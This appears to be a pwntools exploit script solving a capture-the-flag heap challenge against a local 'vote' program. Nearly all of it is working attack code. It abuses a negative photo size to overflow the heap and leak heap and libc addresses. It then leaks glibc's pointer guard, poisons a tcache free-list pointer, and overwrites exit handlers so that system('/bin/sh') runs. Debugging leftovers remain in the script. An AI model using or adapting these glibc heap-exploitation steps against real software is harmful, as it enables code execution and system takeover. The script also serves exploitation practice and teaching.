from pwn import *
io = process("./vote",aslr=False)
libc = ELF("./libc.so.6")

def add_ctf(idx,name,topic_cnt,do_photo,width,height,photo,topics=[]):
    io.sendlineafter(b"input:",b"1")
    io.sendlineafter(b"idx",str(idx).encode())
    io.sendlineafter(b"name",name)
    io.sendlineafter(b"topic cnt",str(topic_cnt).encode())

    for i in range(topic_cnt):
        io.sendlineafter(b"topic>",topics[i])

    if do_photo:
        io.sendlineafter(b"photo?",b"y")
        io.sendlineafter(b"width?",str(width).encode())
        io.sendlineafter(b"height",str(height).encode())
        io.sendafter(b"reading photo below>>",photo)  

    else:
         io.sendlineafter(b"photo?",b"n")

def vote_ctf(idx):
    io.sendlineafter(b"input:",b"2")
    resp = io.recvuntil(b"ctf idx:")
    io.sendline(str(idx).encode())
    return resp

def remove_ctf(idx):
    io.sendlineafter(b"input:",b"3")
    io.sendlineafter(b"idx?",str(idx).encode())

def mangle(dest,pos):
    return (pos >> 12) ^ dest

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


# leak heap and libc
add_ctf(0,b"AAAA",1,False,0,0,0,topics=["a"]) # make topic to prevent consolidation
add_ctf(1,b"BBBB",1,False,0,0,0,topics=["b"])
remove_ctf(0)
remove_ctf(1)

payload = b"A"*0x900 + p64(0x1337133713371337)
add_ctf(0,b"AAAA",1,True,-32767,-1,payload,topics=["a"])
io.recvuntil(p64(0x1337133713371337))
heap_base = u64(io.recv(6) + b"\x00\x00") - 0x131a0
log.info("HEAP BASE: " + hex(heap_base))

remove_ctf(0)
fake_str = p64(heap_base+0x11eb0) + p64(6) 
payload = fake_str.ljust(0x900,b"\x00") + p64(0x1337133713371337) + p64(heap_base+0x12878) + p64(heap_base+0x12898) + p64(heap_base+0x12898)
add_ctf(0,b"AAAA",1,True,-32767,-1,payload,topics=["a"])

libc.address = u64(vote_ctf(0)[0x5d:0x5d+6]+b"\x00\x00") - 0x21ace0
log.info("LIBC BASE: " + hex(libc.address))
add_ctf(1,b"placeholder",1,False,0,0,0,topics=["a"])

# leak ptr guard
fake_str = p64(libc.address-0xe7c10) + p64(10) 
payload = fake_str.ljust(0x900,b"\x00") + p64(0x1337133713371337) + p64(heap_base+0x13208) + p64(heap_base+0x13228) + p64(heap_base+0x13228)
add_ctf(2,b"AAAA",1,True,-32767,-1,payload,topics=["a"])
ptr_guard = u64(vote_ctf(0)[0x108:0x108+8])
log.info("POINTER GUARD: " + hex(ptr_guard))


# setup heap
add_ctf(3,b"AAAA",1,False,0,0,0,topics=[b"A"*0x20]) # pad
add_ctf(4,b"AAAA",1,False,0,0,0,topics=[b"A"*0x20]) # corrupt 0x30 chunks
remove_ctf(4)

# overwrite fd ptr in tcache
fd_overwrite  = b"A"*0x900  + p64(0x1337133713371337) + p64(0)*2
fd_overwrite += p64(0) + p64(0x31) + p64(mangle(libc.address+0x21bf00-0x20,heap_base+0x14ed0)) + p64(0)*5
fd_overwrite += p64(0) + p64(0x31) + p64(mangle(libc.address+0x21bf00-0x20,heap_base+0x14f00)) + p64(0)
add_ctf(5,b"AAAA",0,True,-32767,-1,fd_overwrite)

# overwrite exit_func
system_enc = rol(libc.symbols["system"]^ptr_guard,0x11,64)

exit_funcs = p64(5) + p64(system_enc) + p64(next(libc.search(b"/bin/sh")))
add_ctf(6,b"AAAA",2,False,0,0,0,topics=[exit_funcs])
gdb.attach(io,gdbscript="x/24gx 0x1555552adf00-0x20")

io.interactive()

# one gadget doesnt work right
